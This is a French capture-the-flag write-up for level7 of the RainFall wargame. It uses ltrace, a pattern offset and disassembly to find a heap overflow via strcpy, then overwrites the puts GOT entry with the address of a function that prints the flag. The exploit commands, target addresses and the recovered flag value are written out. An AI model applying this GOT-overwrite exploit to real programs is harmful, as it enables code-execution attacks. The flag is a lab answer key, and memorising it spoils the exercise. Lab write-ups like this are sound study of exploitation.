Un premier test rapide montre que le binaire prend 2 arguments et donne "~~":
```bash
level7@RainFall:~$ ./level7 aaa bbb
~~
```
Testons avec **ltrace**. 
```bash
level7@RainFall:~$ ltrace ./level7 aaaaaaaa bbbbbbbb
__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                     = 0x0804a008
malloc(8)                                                     = 0x0804a018
malloc(8)                                                     = 0x0804a028
malloc(8)                                                     = 0x0804a038
strcpy(0x0804a018, "aaaaaaaa")                                = 0x0804a018
strcpy(0x0804a038, "bbbbbbbb")                                = 0x0804a038
fopen("/home/user/level8/.pass", "r")                         = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
nous avons un segfault, mais nous voyons 2 **strcpy** dont nous savons qu'ils sont suceptibles au buffer overrun d'après le man. Nous avons aussi une fonction fopen qui essaye d'ouvrir le flag.
Testons avec un pattern sur le premier argument:
```bash
level7@RainFall:~$ python /tmp/pattern
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1A
c2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A bbbbbbbb
__libc_start_main(0x8048521, 3, 0xbffff774, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                     = 0x0804a008
malloc(8)                                                     = 0x0804a018
malloc(8)                                                     = 0x0804a028
malloc(8)                                                     = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)     = 0x0804a018
strcpy(0x37614136, "bbbbbbbb" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
level7@RainFall:~$ python /tmp/pattern > /tmp/str
level7@RainFall:~$  python /tmp/pattern /tmp/str 0x37614136
offset found at: 20
```
Donc à l'offset 20, le buffer de destination du deuxième strcpy est écrasé par l'argument 1. On peut y passer une adresse. On remarque aussi que le buffer de dest du deuxième strcpy est l'adresse du 4ème malloc: **0x0804a038** on peut donc écraser des adresses de retour à l'aide d'un buffer overrun.
désassemblons:

```bash
level7@RainFall:~$ objdump -d ./level7 -M intel
.....
08048400 <puts@plt>:
 8048400:       ff 25 28 99 04 08       jmp    DWORD PTR ds:0x8049928
 8048406:       68 28 00 00 00          push   0x28
 804840b:       e9 90 ff ff ff          jmp    80483a0 <_init+0x34>

.....

Dump of assembler code for function m:
   0x080484f4 <+0>:     push   ebp
   0x080484f5 <+1>:     mov    ebp,esp
   0x080484f7 <+3>:     sub    esp,0x18
   0x080484fa <+6>:     mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    edx,0x80486e0
   0x0804850b <+23>:    mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:    mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:    mov    DWORD PTR [esp],edx
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
   0x0804851f <+43>:    leave
   0x08048520 <+44>:    ret
End of assembler dump.
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   ebp
   0x08048522 <+1>:     mov    ebp,esp
   0x08048524 <+3>:     and    esp,0xfffffff0
   0x08048527 <+6>:     sub    esp,0x20
   0x0804852a <+9>:     mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:    mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:    mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:    mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    edx,eax
   0x08048552 <+49>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:    mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:    mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:    mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:    mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:    mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    edx,eax
   0x08048581 <+96>:    mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:   mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:   mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:   add    eax,0x4
   0x0804858e <+109>:   mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:   mov    edx,eax
   0x08048592 <+113>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:   mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:   mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:   mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:   add    eax,0x8
   0x080485ab <+138>:   mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:   mov    edx,eax
   0x080485af <+142>:   mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:   mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:   mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:   mov    DWORD PTR [esp],eax
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    edx,0x80486e9
   0x080485c7 <+166>:   mov    eax,0x80486eb
   0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:   mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    eax,0x0
   0x08048601 <+224>:   leave
   0x08048602 <+225>:   ret
```
On remarque la fonction **m** qui fait un printf sur le contenu de **0x8049960**
A l'aide de gdb inspectons cette adresse qui est aussi en paramètre de fgets:
```bash
(gdb) x/s 0x8049960
0x8049960 <c>:   ""
```
Il s'agit d'une variable globale c, donc **fopen** lit le flag, **fgets** le copie dans c. On peut le print dans **m** mais **m** n'est jamais appelé, à la place le main termine par un **puts**.
On va donc faire un ret2lib après **fgets** et écraser l'adresse de **puts** pour mettre celle de **m**
l'adresse de **puts** est **0x8049928**
celle de **m** est **0x080484f4**, notre payload sera donc de la forme:
- av1 = offset de 20 octet + adresse ou le deuxième strcpy va écrire i.e. **0x0x8049928**
- av2 = adresse de **m** à écrire dans la zone pointée par **0x0x8049928**, i.e. **0x080484f4**
```bash
level7@RainFall:~$ python /tmp/exploit.py 0x0x8049928 0x080484f4 20
crafting payload...
done:
/tmp/payload_level7
level7@RainFall:~$ cat /tmp/payload_level7 | xargs ./level7
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1728666682
 ```
 Bim
